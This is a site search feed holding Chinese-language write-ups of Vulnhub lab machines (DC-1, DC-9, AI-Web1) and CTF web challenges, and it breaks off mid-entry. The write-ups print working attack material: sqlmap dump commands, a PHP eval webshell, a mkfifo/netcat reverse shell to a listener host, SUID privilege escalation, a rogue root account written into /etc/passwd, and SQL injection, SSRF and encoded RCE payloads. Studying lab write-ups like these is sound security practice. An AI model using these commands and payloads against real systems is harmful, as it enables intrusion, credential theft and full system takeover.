<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub-DC1</title>
      <link href="/posts/3bdfdcb0/"/>
      <url>/posts/3bdfdcb0/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>首先将虚拟靶机的网络设置为net模式</p><p>首先<code>arp-scan-l</code>扫描存活主机</p><p><img src="https://pic.imgdb.cn/item/66e23295d9c307b7e90b4ea0.png"></p><p>浏览器页面访问主机</p><p><img src="https://pic.imgdb.cn/item/66e232ced9c307b7e90b7d95.png"></p><p>nmap扫描开放的端口</p><p><img src="https://pic.imgdb.cn/item/66e2330ad9c307b7e90ba02b.png"></p><p>继续扫描端口的版本信息</p><p><img src="https://pic.imgdb.cn/item/66e23351d9c307b7e90bcfe5.png"></p><p>分析页面信息<code>whatweb 192.168.154.137</code></p><p><img src="https://pic.imgdb.cn/item/66e2339ad9c307b7e90c0138.png"></p><p>发现网页的CMS框架是Drupal7，搜索Drupal7存在的漏洞</p><p><img src="https://pic.imgdb.cn/item/66e234fed9c307b7e90d1091.png"></p><p>那么直接进入msf  <code>msfconsole</code></p><p><code>search drupal</code></p><p><img src="https://pic.imgdb.cn/item/66e2364bd9c307b7e90e017f.png"></p><p>使用第二个</p><p>使用<code>set rhosts</code>设置目标靶机的ip</p><p><img src="https://pic.imgdb.cn/item/66e236ced9c307b7e90e6504.png"></p><p>run 运行后ls查看网站目录结构</p><p><img src="https://pic.imgdb.cn/item/66e23751d9c307b7e90ec6ea.png"></p><p>发现flag1.txt尝试cat 发现提示信息</p><p><img src="https://pic.imgdb.cn/item/66e25865d9c307b7e93bd95c.png"></p><p>提示在配置文件中</p><p>输入shell后用python写一段交互式脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e25a2ed9c307b7e94097ce.png"></p><p>查找配置文件的路径 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sites/default/settings.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e25b12d9c307b7e943f5d8.png"></p><p>进入后cat settings.py查看内容</p><p>发现是一段php代码，并且有flag2的提示信息</p><p><img src="https://pic.imgdb.cn/item/66e25b6ad9c307b7e9452cd2.png"></p><p>并且给出了mysql的用户名与密码</p><p><img src="https://pic.imgdb.cn/item/66e25b9cd9c307b7e9462c85.png"></p><p>数据库连接</p><p><img src="https://pic.imgdb.cn/item/66e25c27d9c307b7e946e62b.png"></p><p>查看数据库</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240912111449580.png" alt="image-20240912111449580"></p><p>查看drupaldb数据库中的表</p><p><img src="https://pic.imgdb.cn/item/66e25cdfd9c307b7e947a52a.png"></p><p>存在users表，查看users表的结构</p><p><img src="https://pic.imgdb.cn/item/66e25d7fd9c307b7e948508a.png"></p><p>查看name,pass的内容</p><p><img src="https://pic.imgdb.cn/item/66e25ddad9c307b7e948aa2d.png"></p><p>发现admin</p><p>密码的加密方式是自定义的，查找存在password字样的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *password*</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e25e68d9c307b7e949423b.png"></p><p>发现password-hash.sh文件，查看文件内容</p><p><img src="https://pic.imgdb.cn/item/66e2e4dbd9c307b7e91ae88e.png"></p><p>是一段php代码</p><p>那么我们可以利用这个文件，将上面我们发现的admin账户的密码改成我们想要的值(e.g. 123456)</p><p><img src="https://pic.imgdb.cn/item/66e2e5c6d9c307b7e91c43a7.png"></p><p>那么便可以将得到的值替换数据库中存储的密码值</p><p>先连接数据库后  <code>mysql -udbuser -pR0ck3t</code></p><p>进入到drupaldb库中 <code>use drupaldb</code></p><p>然后使用update语句更新存储的值 </p><p><img src="https://pic.imgdb.cn/item/66e2e6ecd9c307b7e920f009.png"></p><p>更新完成后使用我们自定义的值在页面登录</p><p><img src="https://pic.imgdb.cn/item/66e2e73ad9c307b7e92219c3.png"></p><p>登录成功后在dashboard中看到了flag3的字样</p><p>点击查看 发现提示信息</p><p>意思为：特殊的PERMS将有助于找到passwd-但您需要执行该命令以确定如何获取shadow中的内容。</p><p>查看&#x2F;etc&#x2F;passwd</p><p><img src="https://pic.imgdb.cn/item/66e2e85bd9c307b7e926cbf6.png"></p><p>最后一行发现flag4,并且flag4是普通用户</p><p>读取其内容</p><p><img src="https://pic.imgdb.cn/item/66e2e8d2d9c307b7e9276a4c.png"></p><p>提示获取flag4需要root权限</p><p>结合flag3的提示Special PERMS（特殊权限）指带有权限的特殊文件，可以想到使用suid提权</p><p>首先使用命令查找 这些具有特殊权限的文件</p><p><code>find / -perm /4000 2&gt;/dev/null</code></p><p><img src="https://pic.imgdb.cn/item/66e2ea32d9c307b7e9293ca6.png"></p><p>可以使用find命令提权</p><p>首先可以查看find命令的权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> 666</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">find -name 666 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66e2eddfd9c307b7e92eb120.png"></p><p>提权 <code>/bin/bash</code> 或者 <code>/bin/sh</code></p><p>提权后访问&#x2F;root&#x2F; 拿到flag</p><p><img src="https://pic.imgdb.cn/item/66e2ee20d9c307b7e92f2543.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC9</title>
      <link href="/posts/35045482/"/>
      <url>/posts/35045482/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>下载好靶机后，将靶机网络设置为net模式</p><p>kali扫描主机 <code>arcp-scan -l</code></p><p><img src="https://pic.imgdb.cn/item/66dabed4d9c307b7e9271e17.png"></p><p>访问页面</p><p><img src="https://pic.imgdb.cn/item/66dabef1d9c307b7e92733a7.png"></p><p>dirb扫描发现扫出来的目录与页面展示的目录一样‘</p><p><img src="https://pic.imgdb.cn/item/66dae157d9c307b7e95311c4.png"></p><p><img src="https://pic.imgdb.cn/item/66dae171d9c307b7e9535971.png"></p><p>nmap扫描查看开放的端口</p><p><img src="https://pic.imgdb.cn/item/66dae206d9c307b7e9540bfb.png"></p><p>80端口开放，22端口关闭</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在&#x2F;search.php页面存在登录界面，猜测存在sql注入</p><p>sqlmap测试</p><p><img src="https://pic.imgdb.cn/item/66dae387d9c307b7e956842f.png"></p><p>存在sql注入漏洞，依次爆库名，表名，列名</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch --dbs</code></p><p><img src="https://pic.imgdb.cn/item/66dae428d9c307b7e957e370.png"></p><p>首先查看users库的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users --tables</code></p><p><img src="https://pic.imgdb.cn/item/66dae4a5d9c307b7e958901a.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae533d9c307b7e959a422.png"></p><p>查看username与password的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails -C username,password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae59dd9c307b7e95a6f24.png"></p><p>将得到的username与password分别保存到user与password中</p><p>选一个用户在&#x2F;manage.php页面登录，发现报错</p><p>接着查看Staff库的内容</p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff --columns</code></p><p><img src="https://pic.imgdb.cn/item/66dae67ad9c307b7e95cf176.png"></p><p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff -T Users -C Username,Password --dump</code></p><p><img src="https://pic.imgdb.cn/item/66dae74ad9c307b7e95e4f32.png"></p><p>发现一个新的账号和密码，尝试登录发现成功</p><p><img src="https://pic.imgdb.cn/item/66dae7a1d9c307b7e95e98c1.png"></p><p>根据成功登录后的界面File does not exist猜测可能存在文件包含漏洞</p><p><code>noglob wfuzz -c -u http://192.168.154.136/manage.php?FUZZ=../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;Cookie:PHPSESSID=80guork76fj0lt1gq8nvnasdhb&quot; --hw 100</code></p><p><img src="https://pic.imgdb.cn/item/66daec6ed9c307b7e9638d6f.png"></p><p>存在file参数</p><p>尝试使用BurpSuite爆破</p><p><img src="https://pic.imgdb.cn/item/66daedabd9c307b7e964bcd0.png"></p><p>接着访问&#x2F;proc&#x2F;sched_debug查看cpu的调度状况</p><p><img src="https://pic.imgdb.cn/item/66daeeb3d9c307b7e965ce40.png"></p><p>在调度进程中发现knockd</p><p><img src="https://pic.imgdb.cn/item/66daef07d9c307b7e966d7ac.png"></p><p>knockd.conf文件存在于&#x2F;etc&#x2F;knockd.conf下，与ssh端口的开放有关</p><p>访问knockd的目录，查看其内容</p><p><img src="https://pic.imgdb.cn/item/66daefaed9c307b7e96894a9.png"></p><p>意思为依次顺序访问7469，8475，9842端口后，ssh的22端口开放，逆序访问则关闭，那么依次访问端口</p><p><img src="https://pic.imgdb.cn/item/66daf041d9c307b7e969ab56.png"></p><p>访问后发现22端口开放</p><p>下面从22端口入手，将上文中我们得到的用户名和密码爆破</p><p><img src="https://pic.imgdb.cn/item/66daf11bd9c307b7e96ba1e7.png"></p><p>得到三个用户名与密码</p><p>依次尝试ssh连接，在janitor用户下发现多一层目录</p><p><img src="https://pic.imgdb.cn/item/66daf1c4d9c307b7e96d2aab.png"></p><p>发现新的密码，将新的密码保存起来，再结合之前的用户名再次爆破</p><p><img src="https://pic.imgdb.cn/item/66daf2dcd9c307b7e96ec197.png"></p><p>发现新的用户名和密码，ssh连接访问</p><p><img src="https://pic.imgdb.cn/item/66daf3bcd9c307b7e9710a4b.png"></p><p>sudo -l查看用户权限</p><p>发现可以不需要密码访问test</p><p>查看test的文件属性，发现使可执行文件</p><p><img src="https://pic.imgdb.cn/item/66daf49ed9c307b7e973050e.png"></p><p>在&#x2F;opt&#x2F;devstuff&#x2F;下可以发现源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>作用就是将一个文件的内容读取出来，并追加到另一个文件中</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>那么我们可以尝试直接追加一个有root权限的账号到&#x2F;etc&#x2F;passwd中</p><p><img src="https://pic.imgdb.cn/item/66daf5a2d9c307b7e973fc12.png"></p><p>先将生成的账号添加到临时文件中，再使用test追加到&#x2F;etc&#x2F;passwd&#x2F;中</p><p><img src="https://pic.imgdb.cn/item/66daf67fd9c307b7e974c5fd.png"></p><p>提权后访问&#x2F;root&#x2F;成功拿到flag</p><p><img src="https://pic.imgdb.cn/item/66daf6ead9c307b7e97522c7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机--AI-Web1</title>
      <link href="/posts/ff3ef111/"/>
      <url>/posts/ff3ef111/</url>
      
        <content type="html"><![CDATA[<h2 id="Ai-Web1"><a href="#Ai-Web1" class="headerlink" title="Ai-Web1"></a>Ai-Web1</h2><h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>首先netdiscover发现靶机ip</p><p><img src="https://pic.imgdb.cn/item/66bc724ad9c307b7e994d94a.png"></p><p>使用nmap扫描端口</p><p><img src="https://pic.imgdb.cn/item/66bc7263d9c307b7e99537d0.png"></p><p>查找发现只开了80端口</p><p>访问靶机ip</p><p><img src="https://pic.imgdb.cn/item/66bc7278d9c307b7e9958846.png"></p><p>接着使用dirb对ip进行扫描</p><p><img src="https://pic.imgdb.cn/item/66bc728fd9c307b7e995dda4.png"></p><p>对扫描到的目录依次进行访问</p><p>存在网络爬虫协议robots.txt，在&#x2F;robots.txt下出现两个新的目录</p><p><img src="https://pic.imgdb.cn/item/66bc72abd9c307b7e9964568.png"></p><p>那么依次对两个目录进行访问</p><p><img src="https://pic.imgdb.cn/item/66bc7320d9c307b7e997f50d.png"></p><p>均访问不了，显示没有权限，访问<code>http://192.168.154.135/se3reTdir777/</code>出现一个提交框</p><p><img src="https://pic.imgdb.cn/item/66bc738ad9c307b7e9996a21.png"></p><p>提交**’**测试，出现</p><p><img src="https://pic.imgdb.cn/item/66bc73cad9c307b7e99a3263.png"></p><p>存在sql注入漏洞</p><p>那么接着对<code>http://192.168.154.135/m3diNf0/</code>和<code>http://192.168.154.135/se3reTdir777/</code>进行目录扫描</p><p><img src="https://pic.imgdb.cn/item/66bc742ad9c307b7e99b75aa.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7483d9c307b7e99d09ec.png">)</p><p>m3diNf0&#x2F;下存在info.php</p><p>se3reTdir777下存在index.php</p><p>依次访问</p><p><a href="http://192.168.154.135/m3diNf0/info.php%E4%B8%8B%E5%87%BA%E7%8E%B0phpinfo()%E7%95%8C%E9%9D%A2%EF%BC%8C%E6%90%9C%E7%B4%A2document%E4%BC%9A%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84">http://192.168.154.135/m3diNf0/info.php下出现phpinfo()界面，搜索document会发现网站的绝对路径</a> &#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213</p><p><img src="https://pic.imgdb.cn/item/66bc74c8d9c307b7e99d77df.png"></p><p>se3reTdir777下存在的index.php出现提交框，猜测存在sql注入漏洞</p><p><img src="https://pic.imgdb.cn/item/66bc751ed9c307b7e99dbebd.png">)</p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>直接使用工具sqlmap测试</p><p><img src="https://pic.imgdb.cn/item/66bc755fd9c307b7e99deef2.png"></p><p>确实存在sql注入漏洞</p><p><img src="https://pic.imgdb.cn/item/66bc75a3d9c307b7e99e25b3.png"></p><p>那么依次爆库名，表名，列名，字段值</p><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p><img src="https://pic.imgdb.cn/item/66bc75cdd9c307b7e99e477a.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc7611d9c307b7e99e7b23.png"></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p><img src="https://pic.imgdb.cn/item/66bc763fd9c307b7e99e9dd2.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc767ed9c307b7e99ecf05.png"></p><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p><img src="https://pic.imgdb.cn/item/66bc76a9d9c307b7e99eed70.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc76dcd9c307b7e99f1aea.png">)</p><p><img src="https://pic.imgdb.cn/item/66bc7706d9c307b7e99f3c4a.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7765d9c307b7e99f83aa.png"></p><p>并没有什么可以利用到的地方</p><p>尝试通过sqlmap获取shell</p><p><img src="https://gitee.com/mazishu/images/raw/master/image-20240804210216007.png" alt="image-20240804210216007"></p><p><img src="https://pic.imgdb.cn/item/66bc77edd9c307b7e99fedcf.png"></p><p>拿到了shell<img src="https://pic.imgdb.cn/item/66bc7814d9c307b7e9a00e8d.png"></p><p>输入id查看当前shell用户所属组</p><p><img src="https://pic.imgdb.cn/item/66bc7876d9c307b7e9a059b2.png"></p><p>是权限比较低的www-data</p><h3 id="3-上传木马"><a href="#3-上传木马" class="headerlink" title="3.上传木马"></a>3.上传木马</h3><p>在kali中写一个一句话木马文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将木马文件上传到我们发现的绝对路径下</p><p><img src="https://pic.imgdb.cn/item/66bc78dad9c307b7e9a0aa8e.png"></p><p>访问上传的木马路径</p><p><img src="https://pic.imgdb.cn/item/66bc7913d9c307b7e9a0d476.png"></p><p>空白则上传成功</p><p>使用蚁剑连接</p><p><img src="https://pic.imgdb.cn/item/66bc7954d9c307b7e9a10c70.png"></p><p><img src="https://pic.imgdb.cn/item/66bc7987d9c307b7e9a13189.png"></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><p>首先kali上面监听一下端口 <code>nv -lvvp 6666</code></p><p><img src="https://pic.imgdb.cn/item/66bc79c4d9c307b7e9a15d4a.png"></p><p>在蚁剑中我们上传的木马文件的位置打开终端</p><p><img src="https://pic.imgdb.cn/item/66bc79ecd9c307b7e9a17c8b.png"></p><p>发现-e参数不可用</p><p>那么使用命令**<code>rm /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.103 6666 &gt;/tmp/f</code>**</p><p><code>rm /tmp/f</code>：删除 <code>/tmp/f</code> 文件（如果存在）。</p><p><code>mkfifo /tmp/f</code>：在 <code>/tmp/</code> 目录中创建一个命名管道（FIFO），文件名为 <code>f</code>。</p><p><code>cat /tmp/f</code>：读取命名管道 <code>/tmp/f</code> 中的内容。</p><p><code>|/bin/sh -i 2&gt;&amp;1</code>：通过管道将读取的内容传递给 <code>/bin/sh -i</code>，它启动一个交互式 shell 会话。<code>2&gt;&amp;1</code> 将标准错误输出重定向到标准输出。</p><p><code>| nc 192.168.0.103 6666</code>：将 shell 会话的输出通过 <code>netcat</code> 发送到 IP 地址 <code>192.168.0.103</code> 的 6666 端口。</p><p><code>&gt;/tmp/f</code>：将从 <code>netcat</code> 接收到的数据写回到命名管道 <code>/tmp/f</code>，从而形成一个循环。</p><p><img src="https://pic.imgdb.cn/item/66bc7a27d9c307b7e9a1aa55.png"></p><p>成功反弹了shell</p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>在kali页面使用python写交互</p><p> <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://pic.imgdb.cn/item/66d53fcfd9c307b7e98c6095.png"></p><p>提权的方法可以使用，添加一个账户进行登入，提权</p><p>使用openssl passwd来生成一个密码作为用户的账号密码，linux中密码通常存放在&#x2F;etc&#x2F;shadow中，以加密形式存放</p><p>-1：表示采用的是MD5加密算法。</p><p>-salt：指定salt值，不使用随机产生的salt。在使用加密算法进行加密时，即使密码一样，salt不一样，所计算出来的hash值也不一样，除非密码一样，salt值也一样，计算出来的hash值才一样。</p><p><img src="https://pic.imgdb.cn/item/66d54a9dd9c307b7e99b14ad.png"></p><p>创建用户名为hacker 密码为123456的用户</p><p><img src="https://pic.imgdb.cn/item/66d54ad6d9c307b7e99b3c10.png"></p><p>将用户信息写入&#x2F;etc&#x2F;passwd</p><p><img src="https://pic.imgdb.cn/item/66d54af8d9c307b7e99b53c0.png"></p><p>提权</p><p><img src="https://pic.imgdb.cn/item/66d54b83d9c307b7e99bb9e3.png"></p><p>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB刷一刷</title>
      <link href="/posts/5286b664/"/>
      <url>/posts/5286b664/</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p><img src="https://pic.imgdb.cn/item/66b6d4f2d9c307b7e955d34f.png"><br>提示ssrf。首先在输入栏输入flag，给出提示</p><p><img src="https://pic.imgdb.cn/item/66b6d503d9c307b7e955df14.png"></p><p>那我们便使用file协议读取&#x2F;fl4g</p><p>提示如下：</p><p><img src="https://pic.imgdb.cn/item/66b6d515d9c307b7e955ea67.png"></p><p>访问ha1x1ux1u.php</p><p><img src="https://pic.imgdb.cn/item/66b6d528d9c307b7e955f7a0.png"></p><p>得到一段php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#关闭错误报告</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];<span class="comment">#参数名为file</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;<span class="comment">#如果参数的值中有file则出错，不报错则输出参数值对应文件的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=../../../flag</span><br></pre></td></tr></table></figure><p>使得 PHP 脚本尝试访问根目录之上三层目录中名为 <code>flag</code> 的文件。</p><p><img src="https://pic.imgdb.cn/item/66b6d541d9c307b7e9560905.png"></p><p>或使用其他协议进行读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d557d9c307b7e95617b7.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d56cd9c307b7e956279b.png"></p><h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>进入网页后代码审计</p><p><img src="https://pic.imgdb.cn/item/66b6d582d9c307b7e9563c97.png"></p><p>发现题目将常用字符和大小写字母都禁止了</p><p>那么试着将要传入的命令取反看看</p><p><img src="https://pic.imgdb.cn/item/66b6d598d9c307b7e9564bb8.png"></p><p>运行结果：</p><p><img src="https://pic.imgdb.cn/item/66b6d5aad9c307b7e956597d.png"></p><p>发现取反后出来的都是不可见字符，自然不会触发正则匹配的效果</p><p>那么将取反后的效果先进行url编码后再取反传入，网站自动进行url解码后便可以绕过</p><p>那么试着传入phpinfo();试试</p><p>这里我们还需要注意括号的问题直接传入papinfo()的取反</p><p><img src="https://pic.imgdb.cn/item/66b6d5c0d9c307b7e956699d.png"></p><p>并没有出现php的界面，所以这里我们构造payload</p><p><code>payload=?wllm=(~%8F%97%8F%96%91%99%90)();</code></p><p><img src="https://pic.imgdb.cn/item/66b6d5d7d9c307b7e9567acb.png"></p><p>出现了php的页面说明成功的绕过了</p><p>那么接着构造system(‘ls &#x2F;‘)</p><p><img src="https://pic.imgdb.cn/item/66b6d5e9d9c307b7e95689c5.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d5fad9c307b7e95696d1.png"></p><p>传入<code>payload=?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)；</code></p><p><img src="https://pic.imgdb.cn/item/66b6d60fd9c307b7e956a658.png"></p><p>发现flllllaaaaaaggggggg </p><p>构造system(‘cat flllllaaaaaaggggggg &#x2F;‘)</p><p><img src="https://pic.imgdb.cn/item/66b6d61fd9c307b7e956b227.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d62fd9c307b7e956be97.png"></p><p>传入<code>payload=?wllm=(~%8C%86%8C%8B%9A%92）(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p><p>拿到flag</p><p><img src="https://pic.imgdb.cn/item/66b6d63fd9c307b7e956ca07.png"></p><h2 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><h4 id="首先输入一些值判断闭合符号，注入类型"><a href="#首先输入一些值判断闭合符号，注入类型" class="headerlink" title="首先输入一些值判断闭合符号，注入类型"></a>首先输入一些值判断闭合符号，注入类型</h4><p><img src="https://pic.imgdb.cn/item/66b6d67dd9c307b7e956f06f.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d68cd9c307b7e956face.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d69fd9c307b7e9570a37.png"></p><p>判断出使用单引号闭合，无回显但有报错提示，所以为报错注入</p><h4 id="判断有多少列"><a href="#判断有多少列" class="headerlink" title="判断有多少列"></a>判断有多少列</h4><p><img src="https://pic.imgdb.cn/item/66b6d6bad9c307b7e9571ada.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d6c9d9c307b7e957269f.png"></p><p>所以为3列</p><h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>爆库名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select database()))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6ded9c307b7e9573305.png"></p><p>爆表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6edd9c307b7e9573d14.png"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d6fcd9c307b7e95746fb.png"></p><p>爆flag值</p><p>第一段：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(flag)from test_tb))),3--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d70fd9c307b7e95753e6.png"></p><p>第二段：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select substring(group_concat(id,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,flag),31,30) from test_tb)))--+</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66b6d71fd9c307b7e9575e2a.png"></p><p>拼接得到flag</p><h3 id="解法二（sqlmap）"><a href="#解法二（sqlmap）" class="headerlink" title="解法二（sqlmap）"></a>解法二（sqlmap）</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p><img src="https://pic.imgdb.cn/item/66b6d752d9c307b7e9577d18.png"></p><p>结果：</p><p><img 